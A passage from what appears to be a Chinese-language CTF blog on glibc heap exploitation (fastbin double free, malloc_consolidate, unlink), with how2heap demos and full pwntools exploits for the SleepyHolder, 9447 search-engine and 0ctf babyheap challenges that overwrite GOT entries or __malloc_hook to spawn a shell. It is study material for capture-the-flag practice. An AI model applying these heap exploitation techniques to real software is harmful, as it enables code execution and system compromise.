&quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\\n&quot;); free(p1); fprintf(stderr, &quot;Trigger the double free vulnerability!\\n&quot;); fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\\n&quot;); fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: %p %p\\n&quot;, malloc(0x40), malloc(0x40));&#125; 运行结果： 12345678./fastbin_dup_consolidate Allocated two fastbins: p1=0x555dbdb57260 p2=0x555dbdb572b0Now free p1!Allocated large bin to trigger malloc_consolidate(): p3=0x555dbdb57300In malloc_consolidate(), p1 is moved to the unsorted bin.Trigger the double free vulnerability!We can pass the check in malloc() since p1 is not fast top.Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: 0x555dbdb57260 0x555dbdb57260 例题 SleepyHolder简单程度和uaf相当hhhh main 1234567891011121314151617181920212223242526272829303132333435363738394041424344void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; int v3; // eax unsigned int buf; // [rsp+4h] [rbp-1Ch] int fd; // [rsp+8h] [rbp-18h] int v6; // [rsp+Ch] [rbp-14h] char s; // [rsp+10h] [rbp-10h] unsigned __int64 v8; // [rsp+18h] [rbp-8h] v8 = __readfsqword(0x28u); alarm0x3c(); // // puts(&quot;Waking Sleepy Holder up ...&quot;); fd = open(&quot;/dev/urandom&quot;, 0); read(fd, &amp;buf, 4uLL); buf &amp;= 0xFFFu; malloc(buf); // malloc something random to change heap_address every time // sleep(3u); puts(&quot;Hey! Do you have any secret?&quot;); puts(&quot;I can help you to hold your secrets, and no one will be able to see it :)&quot;); while ( 1 ) &#123; puts(&quot;1. Keep secret&quot;); puts(&quot;2. Wipe secret&quot;); puts(&quot;3. Renew secret&quot;); memset(&amp;s, 0, 4uLL); read(0, &amp;s, 4uLL); v3 = atoi(&amp;s); v6 = v3; switch ( v3 ) &#123; case 2: wipe_secret(); //仅仅把free掉并把该chunk的inuse位标记为0 break; case 3: renew_secret(); //重新改写1或者2的chunk，大小最大还是原来那么大。 break; case 1: keep_serect(); //选择123来使用calloc分别分配大小为40,4000,400000大小的chunk且都只能分配一块，12的chunk可以wipe或者renew，3的chunk分配就再也没法变了。inuse位会被标记为1. break; &#125; &#125;&#125; 思路假设三个chunk分别为chunk0,1,2; 首先使用malloc_consolidate()，将chunk0 double free，进入unsortedbin，这个时候再申请chunk0，会将其从fastbin中取下，且inuse位被标记为1. 之后使用unlink，伪造在chunk0中，free chunk1，fake chunk便会被free进入chunklist。 通过覆盖堆指针，将free_got覆写为puts_plt，泄露出atoi_got的地址，从而计算出libc的基址。 算出system的地址，并将其写入free_got，调用free便可以getshell。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# -*- coding:utf-8 -*-from pwn import *context.log_level = &apos;debug&apos;context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]p = process(&apos;./SleepyHolder&apos;)elf = ELF(&apos;./SleepyHolder&apos;)libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;) //ldd ./SleepyHolderdef add(index, content): p.recvuntil(&apos;3. Renew secret\\n&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;\\n&apos;) p.sendline(str(index)) p.recvuntil(&apos;secret: \\n&apos;) p.send(content) def delete(index): p.recvuntil(&apos;3. Renew secret\\n&apos;) p.sendline(&apos;2&apos;) p.recvuntil(&apos;2. Big secret\\n&apos;) p.send(str(index))def update(index, content): p.recvuntil(&apos;3. Renew secret\\n&apos;) p.sendline(&apos;3&apos;) p.recvuntil(&apos;2. Big secret\\n&apos;) p.sendline(str(index)) p.recvuntil(&apos;secret: \\n&apos;) p.send(content)#分配chunk1 chunk2add(1, &apos;a&apos;*0x10)add(2, &apos;b&apos;*0x10)#释放chunk1delete(1)#分配chunk3，让chunk1被移动到unsorted bin，使chunk2的inuse位变为0add(3, &apos;c&apos;*0x10)#这时再释放chunk1，让chunk1重新进入fast bindelete(1)heap_ptr = 0x6020d0 #堆指针#准备unlink，在chunk1中伪造chunkpayload = p64(0) + p64(0x21)payload += p64(heap_ptr - 0x18) + p64(heap_ptr - 0x10)payload += p64(0x20)#因为内存复用，这里设置chunk2的prev_sizeadd(1, payload)#此时chunk2的inuse位是0，所以触发unlinkdelete(2)free_got = elf.got[&apos;free&apos;]atoi_got = elf.got[&apos;atoi&apos;]puts_got = elf.got[&apos;puts&apos;]puts = elf.symbols[&apos;puts&apos;]system_off = libc.symbols[&apos;system&apos;]atoi_off = libc.symbols[&apos;atoi&apos;]#unlink后 堆指针被修改，向现在指针所指内存写入数据#将chunk2指针覆盖为atoi_got#将chunk3指针覆盖为puts_got#将chunk1指针覆盖为free_gotpayload = p64(0) + p64(atoi_got)payload += p64(puts_got) + p64(free_got)update(1, payload)#再次向chunk1写入，相当于向free_got写入#这里将free_got写为putsupdate(1, p64(puts))#删除chunk2，但是free的got表已经被写为puts，所以这里实际调用puts(chunk2)#因为chunk2指针被覆盖为atoi_got，所以输出的是atoi的实际地址#由此可计算出libc_basedelete(2)libc_base = u64(p.recv(6) + &apos;\\x00\\x00&apos;) - atoi_off#通过调试发现，这里只能取6个字节print &quot;libc_base : %#x&quot; % libc_base system = libc_base + system_off#将free的got表写为systemupdate(1, p64(system))#向chunk2中写入binsh 释放chunk2时 chunk2的内容会作为参数add(2, &apos;/bin/sh\\x00&apos;)delete(2)p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Introduction to pwn2.1-fastbin_dup","slug":"introduction-to-pwn2-1-fastbin-dup","date":"2018-10-15T11:14:55.000Z","updated":"2018-10-18T08:38:54.171Z","comments":true,"path":"2018/10/15/introduction-to-pwn2-1-fastbin-dup/","link":"","permalink":"http://siriuswhiter.tk/2018/10/15/introduction-to-pwn2-1-fastbin-dup/","excerpt":"","text":"尽量去有秩序的入门堆。。。但大部分堆看起来都太痛苦了。。 fastbin_dup原理利用堆对fastbin的管理特性，当chunk在fastbin的表头时，再次释放会触发检测机制，防止double free，但是若不在表头，便不会有这个问题。产生这种结果的原因是： fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。 可以用how2heap的例子来理解： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, &quot;This file extends on fastbin_dup.c by tricking malloc into\\n&quot; &quot;returning a pointer to a controlled location (in this case, the stack).\\n&quot;); unsigned long long stack_var; fprintf(stderr, &quot;The address we want malloc() to return is %p.\\n&quot;, 8+(char *)&amp;stack_var); fprintf(stderr, &quot;Allocating 3 buffers.\\n&quot;); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, &quot;1st malloc(8): %p\\n&quot;, a); fprintf(stderr, &quot;2nd malloc(8): %p\\n&quot;, b); fprintf(stderr, &quot;3rd malloc(8): %p\\n&quot;, c); fprintf(stderr, &quot;Freeing the first one...\\n&quot;); free(a); fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\\n&quot;, a, a); // free(a); fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\\n&quot;, b); free(b); fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\\n&quot;, a); free(a); fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. &quot; &quot;We&apos;ll now carry out our attack by modifying data at %p.\\n&quot;, a, b, a, a); unsigned long long *d = malloc(8); fprintf(stderr, &quot;1st malloc(8): %p\\n&quot;, d); fprintf(stderr, &quot;2nd malloc(8): %p\\n&quot;, malloc(8)); fprintf(stderr, &quot;Now the free list has [ %p ].\\n&quot;, a); fprintf(stderr, &quot;Now, we have access to %p while it remains at the head of the free list.\\n&quot; &quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\\n&quot; &quot;so that malloc will think there is a free chunk there and agree to\\n&quot; &quot;return a pointer to it.\\n&quot;, a); stack_var = 0x20; fprintf(stderr, &quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\\n&quot;, a); *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d)); fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\\n&quot;, malloc(8)); fprintf(stderr, &quot;4th malloc(8): %p\\n&quot;, malloc(8));&#125; 运行结果为： 1234567891011121314151617181920212223 ./fastbin_dup_into_stack This file extends on fastbin_dup.c by tricking malloc intoreturning a pointer to a controlled location (in this case, the stack).The address we want malloc() to return is 0x7ffe1abfa870.Allocating 3 buffers.1st malloc(8): 0x56317e17e2602nd malloc(8): 0x56317e17e2803rd malloc(8): 0x56317e17e2a0Freeing the first one...If we free 0x56317e17e260 again, things will crash because 0x56317e17e260 is at the top of the free list.So, instead, we&apos;ll free 0x56317e17e280.Now, we can free 0x56317e17e260 again, since it&apos;s not the head of the free list.Now the free list has [ 0x56317e17e260, 0x56317e17e280, 0x56317e17e260 ]. We&apos;ll now carry out our attack by modifying data at 0x56317e17e260.1st malloc(8): 0x56317e17e2602nd malloc(8): 0x56317e17e280Now the free list has [ 0x56317e17e260 ].Now, we have access to 0x56317e17e260 while it remains at the head of the free list.so now we are writing a fake free size (in this case, 0x20) to the stack,so that malloc will think there is a free chunk there and agree toreturn a pointer to it.Now, we overwrite the first 8 bytes of the data at 0x56317e17e260 to point right before the 0x20.3rd malloc(8): 0x56317e17e260, putting the stack address on the free list4th malloc(8): 0x7ffe1abfa860 可以看出1st malloc分配的内存被分配了两次，这样就可以修改其fd指针来控制分配的chunk的位置，例如chunk4就被分配到了栈里。 例题-9447-search-engine条件程序给出了三个选项。2可以输入一个自己指定长度的句子，然后可以用1来索引2中句子的单词，索引到之后可以选择是否删除该句子。 123456int menu()&#123; puts(&quot;1: Search with a word&quot;); puts(&quot;2: Index a sentence&quot;); return puts(&quot;3: Quit&quot;);&#125; inde a sentence.程序写的很复杂，看起来很揪心。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768int index_a_sentence()&#123; int v0; // eax __int64 v1; // rbp int v2; // er13 char *v3; // r12 signed __int64 v4; // rbx signed __int64 v5; // rbp _DWORD *v6; // rax int v7; // edx __int64 v8; // rdx __int64 v10; // rdx puts(&quot;Enter the sentence size:&quot;); v0 = get_num(); v1 = (unsigned int)(v0 - 1); v2 = v0; if ( (unsigned int)v1 &gt; 0xFFFD ) puts_(&quot;Invalid size&quot;); puts(&quot;Enter the sentence:&quot;); v3 = (char *)malloc(v2); read_until_newline((__int64)v3, v2, 0); v4 = (signed __int64)(v3 + 1); v5 = (signed __int64)&amp;v3[v1 + 2]; v6 = malloc(0x28uLL); v7 = 0; *(_QWORD *)v6 = v3; v6[2] = 0; *((_QWORD *)v6 + 2) = v3; v6[6] = v2; do &#123; while ( *(_BYTE *)(v4 - 1) != 32 ) &#123; v6[2] = ++v7;LABEL_4: if ( ++v4 == v5 ) goto LABEL_8; &#125; if ( v7 ) &#123; v10 = qword_6020B8; qword_6020B8 = (__int64)v6; *((_QWORD *)v6 + 4) = v10; v6 = malloc(0x28uLL); v7 = 0; *(_QWORD *)v6 = v4; v6[2] = 0; *((_QWORD *)v6 + 2) = v3; v6[6] = v2; goto LABEL_4; &#125; *(_QWORD *)v6 = v4++; &#125; while ( v4 != v5 );LABEL_8: if ( v7 ) &#123; v8 = qword_6020B8; qword_6020B8 = (__int64)v6; *((_QWORD *)v6 + 4) = v8; &#125; else &#123; free(v6); &#125; return puts(&quot;Added sentence&quot;);&#125; search word： 123456789101112131415161718192021222324252627282930313233343536void search_with_a_word()&#123; int v0; // ebp void *v1; // r12 __int64 i; // rbx char v3; // [rsp+0h] [rbp-38h] puts(&quot;Enter the word size:&quot;); v0 = get_num(); if ( (unsigned int)(v0 - 1) &gt; 0xFFFD ) puts_(&quot;Invalid size&quot;); puts(&quot;Enter the word:&quot;); v1 = malloc(v0); read_until_newline((__int64)v1, v0, 0); for ( i = qword_6020B8; i; i = *(_QWORD *)(i + 32) ) &#123; if ( **(_BYTE **)(i + 16) ) &#123; if ( *(_DWORD *)(i + 8) == v0 &amp;&amp; !memcmp(*(const void **)i, v1, v0) ) &#123; __printf_chk(1LL, &quot;Found %d: &quot;, *(unsigned int *)(i + 24)); fwrite(*(const void **)(i + 16), 1uLL, *(signed int *)(i + 24), stdout); putchar(10); puts(&quot;Delete this sentence (y/n)?&quot;); read_until_newline((__int64)&amp;v3, 2, 1); if ( v3 == 121 ) &#123; memset(*(void **)(i + 16), 0, *(signed int *)(i + 24)); free(*(void **)(i + 16)); puts(&quot;Deleted!&quot;); &#125; &#125; &#125; &#125; free(v1);&#125; get_num： 123456789101112131415161718__int64 get_num()&#123; __int64 result; // rax char *endptr; // [rsp+8h] [rbp-50h] char nptr; // [rsp+10h] [rbp-48h] unsigned __int64 v3; // [rsp+48h] [rbp-10h] v3 = __readfsqword(0x28u); read_until_newline((__int64)&amp;nptr, 48, 1); result = strtol(&amp;nptr, &amp;endptr, 0); if ( endptr == &amp;nptr ) &#123; __printf_chk(1LL, &quot;%s is not a valid number\\n&quot;, &amp;nptr); result = get_num(); &#125; __readfsqword(0x28u); return result;&#125; 分析get_num这个函数本身有漏洞，它将输入的最大48位字符串转化为数字，但是问题就是在确定字符串时是以结尾的null来判断的，所以我们如果输入48个字符的话，在报错时可能会将之后的栈内存打印出来从而泄露栈地址。 整个过程大概是以一个结构体来保存每个单词：(40个字节) 12345678struct words_struct &#123; addr* words_str; //单词字符串的起始位置(其实是在句子字符串当中的) int64_t size; // 单词大小 addr* ptr_to_sentences; //单词所在的句子字符串的位置 int64_t* size_of_sentences;//句子长度 words_struct* next_word;//链表下一个节点指针 &#125;; 在删除句子时，是将word_struct中ptr_to_sentences所指向的句子释放，但未置为null。在每次释放 i-&gt;sentence_ptr 之前，这个句子的内容就会全部被设置为 \\x00 ，由于单词结构体中存储的单词只是句子的一个指针，所以单词也会被置为 \\x00 。该句子对应的那些单词仍然是存在于链表中的，并没有被删除，因此每次搜索单词的时候，仍然会判断。看起来由于句子内容被置为 \\x00 可以防止通过 *i-&gt;sentence_ptr 验证。然而，由于 chunk 被释放后会被放到 bin 中，当 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的时候，也就有可能会产生 double free 的情况。此外，当句子被 memset 的时候，单词虽然都变为了 \\x00 ，但是我们仍然可以通过两个 \\x00 的比较来绕过 memcmp 的检测。 利用思路1) 利用get_num函数的漏洞试图泄露栈地址2) 泄露libc_address，从而计算出system 和 /bin/sh的地址3) 利用fastbin_dup 进行double free4) 利用double free来覆盖栈中的返回地址控制程序执行system(“/bin/sh”) 思路大抵如此，但是借鉴大佬的exp却都无法正常得到shell，不晓得哪里有问题，或许是环境不一样 exp先附上大佬写的exp，再多捋一捋思路，调试调试，去找到问题。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141#!/usr/bin/env python2from pwn import *context(arch=&quot;amd64&quot;, os=&quot;linux&quot;)p = process(&apos;./search-bf61fbb8fa7212c814b2607a81a84adf&apos;)# binsh_offset 找不到pop_rdi_ret = 0x400e23system_offset = 0x46590puts_offset = 0x6fd60binsh_offset = 1558723def leak_stack(): p.sendline(&apos;A&apos;*48) p.recvuntil(&apos;Quit\\n&apos;) p.recvline() # doesn&apos;t work all the time p.sendline(&apos;A&apos;*48) leak = p.recvline().split(&apos; &apos;)[0][48:] return int(leak[::-1].encode(&apos;hex&apos;), 16)def leak_libc(): # this sentence is the same size as a list node index_sentence((&apos;a&apos;*12 + &apos; b &apos;).ljust(40, &apos;c&apos;)) # delete the sentence search(&apos;a&apos; * 12) p.sendline(&apos;y&apos;) # the node for this sentence gets put in the previous sentence&apos;s spot. # note we made sure this doesn&apos;t reuse the chunk that was just freed by # making it 64 bytes index_sentence(&apos;d&apos; * 64) # free the first sentence again so we can allocate something on top of it. # this will work because 1) the sentence no longer starts with a null byte # (in fact, it should be clear that it starts a pointer to 64 d&apos;s), and 2) # the location where our original string contained `b` is guaranteed to be # zero. this is because after the original sentence was zeroed out, nothing # was allocated at offset 12, which is just padding in the structure. if # we had made the first word in the string 16 bytes instead of 12, then that # would put &apos;b&apos; at a location where it would not be guaranteed to be zero. search(&apos;\\x00&apos;) p.sendline(&apos;y&apos;) # make our fake node node = &apos;&apos; node += p64(0x400E90) # word pointer &quot;Enter&quot; node += p64(5) # word length node += p64(0x602028) # sentence pointer (GOT address of free) node += p64(64) # length of sentence node += p64(0x00000000) # next pointer is null assert len(node) == 40 # this sentence gets allocated on top of the previous sentence&apos;s node. # we can thus control the sentence pointer of that node and leak memory. index_sentence(node) # this simply receives all input from the binary and discards it, which # makes parsing out the leaked address easier below. p.clean() # leak the libc address search(&apos;Enter&apos;) p.recvuntil(&apos;Found 64: &apos;) leak = u64(p.recvline()[:8]) p.sendline(&apos;n&apos;) # deleting it isn&apos;t necessary return leakdef index_sentence(s): p.sendline(&apos;2&apos;) p.sendline(str(len(s))) p.sendline(s)def search(s): p.sendline(&apos;1&apos;) p.sendline(str(len(s))) p.sendline(s)def make_cycle(): index_sentence(&apos;a&apos;*54 + &apos; d&apos;) index_sentence(&apos;b&apos;*54 + &apos; d&apos;) index_sentence(&apos;c&apos;*54 + &apos; d&apos;) search(&apos;d&apos;) p.sendline(&apos;y&apos;) p.sendline(&apos;y&apos;) p.sendline(&apos;y&apos;) search(&apos;\\x00&apos;) p.sendline(&apos;y&apos;) p.sendline(&apos;n&apos;)def make_fake_chunk(addr): # set the fwd pointer of the chunk to the address we want fake_chunk = p64(addr) index_sentence(fake_chunk.ljust(56))def allocate_fake_chunk(binsh_addr, system_addr): # allocate twice to get our fake chunk index_sentence(&apos;A&apos;*56) index_sentence(&apos;B&apos;*56) # overwrite the return address buf = &apos;A&apos;*30 buf += p64(pop_rdi_ret) buf += p64(binsh_addr) buf += p64(system_addr) buf = buf.ljust(56, &apos;C&apos;) index_sentence(buf)def main(): stack_leak = leak_stack() # This makes stack_addr + 0x8 be 0x40 //在泄露的栈地址附近寻找0x40用于充当fakechunk的size stack_addr = stack_leak + 0x5a - 8 log.info(&apos;stack leak: %s&apos; % hex(stack_leak)) log.info(&apos;stack addr: %s&apos; % hex(stack_addr)) libc_leak = leak_libc() libc_base = libc_leak - puts_offset system_addr = libc_base + system_offset binsh_addr = libc_base + binsh_offset log.info(&apos;libc leak: %s&apos; % hex(libc_leak)) log.info(&apos;libc_base: %s&apos; % hex(libc_base)) log.info(&apos;system addr: %s&apos; % hex(system_addr)) log.info(&apos;binsh addr: %s&apos; % hex(binsh_addr)) make_cycle() make_fake_chunk(stack_addr) allocate_fake_chunk(binsh_addr, system_addr) p.interactive()if __name__ == &apos;__main__&apos;: main() 例题-0ctfbabyheap条件炒鸡正规的条件选项题： 12345678./0ctfbabyheap ===== Baby Heap in 2017 =====1. Allocate2. Fill3. Free4. Dump5. ExitCommand: 分配的块可以分析出有一个结构体： 12345 struc_4 structure&#123; 00000000 inuse 00000001 size 00000002 ptr 00000003 &#125;struc_4 ends inuse可以标记块的释放与否，size记录大小，ptr指向分配的内存地址； 各个选项就不一一列举了，每个选项就如它名字一般：allocate使用calloc分配块，最大4096；fill填充用户指定allocate分配的块及新的size，所以很明显可以覆盖指针云云；free将inuse变为0，size归零，free掉指针，但是并未将其指向null；但是因为allocate时使用的是calloc将原空间置零，所以无法UAF。dump检测完inuse位，之后可以将size大小的ptr指向的地址的内容打印出来。 分析即使这个程序的漏洞这么明显，还是不知道怎么下手，满脑子unlink？？不过鉴于这是fastbin_dup处的学习，学学大佬们的思路。 目标：1.leak libc地址 2.利用fastbin_dup将chunk分配到malloc_hook处（malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过写 malloc_hook 来 getshell） 1234567891011gdb-peda$ x/20gx (long long)(&amp;main_arena)-0x300x7fa3a2008c10 &lt;_IO_wide_data_0+304&gt;: 0x00007fa3a2004d60 0x00000000000000000x7fa3a2008c20 &lt;__memalign_hook&gt;: 0x00007fa3a1ed4bf0 0x00007fa3a1ed51600x7fa3a2008c30 &lt;__malloc_hook&gt;: 0x0000000000000000 0x0000000000000000 &lt;-- malloc hook 0x7fa3a2008c40 &lt;main_arena&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c50 &lt;main_arena+16&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c60 &lt;main_arena+32&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c70 &lt;main_arena+48&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c80 &lt;main_arena+64&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c90 &lt;main_arena+80&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008ca0 &lt;main_arena+96&gt;: 0x000055b863881360 0x0000000000000000 exp经过不断的调试，确信本机无法复现成功，因为一块0x10大小的内存被free掉以后，再次alloc本应在free掉的地址处，但是本机却会新开辟一块地方。。所以没救了:( 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211#!/usr/bin/env python from pwn import *import sys context.log_level = &quot;debug&quot; elf = &quot;./0ctfbabyheap&quot;ENV = &#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125; p = process(elf) def alloc(size): p.recvuntil(&quot;Command: &quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;Size: &quot;) p.sendline(str(size)) def fill(idx, content): p.recvuntil(&quot;Command: &quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;Size: &quot;) p.sendline(str(len(content))) p.recvuntil(&quot;Content: &quot;) p.send(content) def free(idx): p.recvuntil(&quot;Command: &quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) def dump(idx): p.recvuntil(&quot;Command: &quot;) p.sendline(&quot;4&quot;) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) p.recvline() return p.recvline() alloc(0x10)alloc(0x10)alloc(0x10)alloc(0x10)alloc(0x80) free(1)free(2) #gdb.attach(p)#main arena and heap #------------------------------------------------------------------------#gdb-peda$ x/20gx &amp;main_arena0x7f6dd27f3c40 &lt;main_arena&gt;: 0x0000000000000000 0x0000000000000000 //there is no fastbin[0],don&apos;t know why...0x7f6dd27f3c50 &lt;main_arena+16&gt;: 0x0000000000000000 0x00000000000000000x7f6dd27f3c60 &lt;main_arena+32&gt;: 0x0000000000000000 0x00000000000000000x7f6dd27f3c70 &lt;main_arena+48&gt;: 0x0000000000000000 0x00000000000000000x7f6dd27f3c80 &lt;main_arena+64&gt;: 0x0000000000000000 0x00000000000000000x7f6dd27f3c90 &lt;main_arena+80&gt;: 0x0000000000000000 0x00000000000000000x7f6dd27f3ca0 &lt;main_arena+96&gt;: 0x000056122eed1360 0x00000000000000000x7f6dd27f3cb0 &lt;main_arena+112&gt;: 0x00007f6dd27f3ca0 0x00007f6dd27f3ca00x7f6dd27f3cc0 &lt;main_arena+128&gt;: 0x00007f6dd27f3cb0 0x00007f6dd27f3cb00x7f6dd27f3cd0 &lt;main_arena+144&gt;: 0x00007f6dd27f3cc0 0x00007f6dd27f3cc0gdb-peda$ x/30gx 0x000056122eed12500x56122eed1250: 0x0000000000000000 0x0000000000000021 chunk 0,in use0x56122eed1260: 0x0000000000000000 0x00000000000000000x56122eed1270: 0x0000000000000000 0x0000000000000021 chunk 1,free0x56122eed1280: 0x0000000000000000 0x00000000000000000x56122eed1290: 0x0000000000000000 0x0000000000000021 chunk 2,free0x56122eed12a0: 0x000056122eed1280 &lt;-- chunk 2&apos;s fd pointer,point to chunk 1 0x00000000000000000x56122eed12b0: 0x0000000000000000 0x0000000000000021 chunk 3,in use0x56122eed12c0: 0x0000000000000000 0x00000000000000000x56122eed12d0: 0x0000000000000000 0x0000000000000091 chunk 4,in use0x56122eed12e0: 0x0000000000000000 0x00000000000000000x56122eed12f0: 0x0000000000000000 0x00000000000000000x56122eed1300: 0x0000000000000000 0x00000000000000000x56122eed1310: 0x0000000000000000 0x00000000000000000x56122eed1320: 0x0000000000000000 0x00000000000000000x56122eed1330: 0x0000000000000000 0x0000000000000000#------------------------------------------------------------------------#payload = p64(0)*3payload += p64(0x21)payload += p64(0)*3payload += p64(0x21)payload += p8(0xd0)fill(0, payload) payload = p64(0)*3payload += p64(0x21)fill(3, payload) #------------------------------------------------------------------------#gdb-peda$ x/30gx 0x000055b8638812500x55b863881250: 0x0000000000000000 0x00000000000000210x55b863881260: 0x0000000000000000 0x00000000000000000x55b863881270: 0x0000000000000000 0x00000000000000210x55b863881280: 0x0000000000000000 0x00000000000000000x55b863881290: 0x0000000000000000 0x00000000000000210x55b8638812a0: 0x000055b8638812d0 -| 0x0000000000000000 &lt;--chunk 2&apos;s fd pointer point to chunk 40x55b8638812b0: 0x0000000000000000 | 0x00000000000000210x55b8638812c0: 0x0000000000000000 | 0x00000000000000000x55b8638812d0: 0x0000000000000000 &lt;- 0x0000000000000021 &lt;-- 0x91 was changed to 0x21 by filling chunk 3 for cheating 0x55b8638812e0: 0x0000000000000000 0x00000000000000000x55b8638812f0: 0x0000000000000000 0x00000000000000000x55b863881300: 0x0000000000000000 0x00000000000000000x55b863881310: 0x0000000000000000 0x00000000000000000x55b863881320: 0x0000000000000000 0x00000000000000000x55b863881330: 0x0000000000000000 0x0000000000000000#------------------------------------------------------------------------#alloc(0x10) //chunk 2&apos;s address but its index is 1 alloc(0x10) //chunk 4&apos;s address but its index is 2payload = p64(0)*3payload += p64(0x91)fill(3, payload) // change backalloc(0x80) //chunk 5free(4) libc_base = u64(dump(2)[:8].strip().ljust(8, &quot;\\x00&quot;))-0x195c98 //0x58 +(0x7fc47fa61c40 - 0x7fc47f8cc000 ) log.info(&quot;libc_base: &quot;+hex(libc_base)) #------------------------------------------------------------------------#gdb-peda$ p main_arena$1 = &#123; mutex = 0x0, flags = 0x0, have_fastchunks = 0x0, fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, top = 0x55dcc4edc430, last_remainder = 0x0, bins = &#123;...&#125; binmap = &#123;0x0, 0x0, 0x0, 0x0&#125;, next = 0x7fc47fa61c40 &lt;main_arena&gt;, &lt;------------## main_arena address next_free = 0x0, attached_threads = 0x1, system_mem = 0x21000, max_system_mem = 0x21000&#125;gdb-peda$ vmmapStart End Perm Name0x00003b8f7c613000 0x00003b8f7c614000 rw-p mapped0x000055dcc365b000 0x000055dcc365d000 r-xp /root/heap/0ctfbabyheap0x000055dcc385c000 0x000055dcc385d000 r--p /root/heap/0ctfbabyheap0x000055dcc385d000 0x000055dcc385e000 rw-p /root/heap/0ctfbabyheap0x000055dcc4edc000 0x000055dcc4efd000 rw-p [heap]0x00007fc47f8aa000 0x00007fc47f8cc000 r--p /usr/lib/x86_64-linux-gnu/libc-2.27.so // I don&apos;t really know what address we need.0x00007fc47f8cc000 0x00007fc47fa12000 r-xp /usr/lib/x86_64-linux-gnu/libc-2.27.so0x00007fc47fa12000 0x00007fc47fa5d000 r--p /usr/lib/x86_64-linux-gnu/libc-2.27.so0x00007fc47fa5d000 0x00007fc47fa61000 r--p /usr/lib/x86_64-linux-gnu/libc-2.27.so0x00007fc47fa61000 0x00007fc47fa63000 rw-p /usr/lib/x86_64-linux-gnu/libc-2.27.so0x00007fc47fa63000 0x00007fc47fa67000 rw-p mapped0x00007fc47fa67000 0x00007fc47fa69000 rw-p mapped0x00007fc47fa8a000 0x00007fc47fa8b000 r--p /usr/lib/x86_64-linux-gnu/ld-2.27.so0x00007fc47fa8b000 0x00007fc47faa9000 r-xp /usr/lib/x86_64-linux-gnu/ld-2.27.so0x00007fc47faa9000 0x00007fc47fab1000 r--p /usr/lib/x86_64-linux-gnu/ld-2.27.so0x00007fc47fab1000 0x00007fc47fab2000 r--p /usr/lib/x86_64-linux-gnu/ld-2.27.so0x00007fc47fab2000 0x00007fc47fab3000 rw-p /usr/lib/x86_64-linux-gnu/ld-2.27.so0x00007fc47fab3000 0x00007fc47fab4000 rw-p mapped0x00007ffd42afd000 0x00007ffd42b1e000 rw-p [stack]0x00007ffd42bee000 0x00007ffd42bf1000 r--p [vvar]0x00007ffd42bf1000 0x00007ffd42bf3000 r-xp [vdso]#------------------------------------------------------------------------##alloc(0x60)free(4) payload = p64(libc_base+0x3c4aed) //malloc_hook&apos;s 0x000000007f address - 0x8 fill(2, payload) alloc(0x60)alloc(0x60) payload = p8(0)*3 //using offset wisely make 0x7f***** as fake size &apos;0x000000007f&apos;payload += p64(0)*2payload += p64(libc_base+0x4345e) //tools called &apos;one_gadget&apos; can help get execv(&apos;/bin/sh&apos;) directly;fill(6, payload) #------------------------------------------------------------------------#root@kali:~/heap# ldd ./0ctfbabyheap linux-vdso.so.1 (0x00007ffd59ff6000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007faf4646f000) /lib64/ld-linux-x86-64.so.2 (0x00007faf46852000) 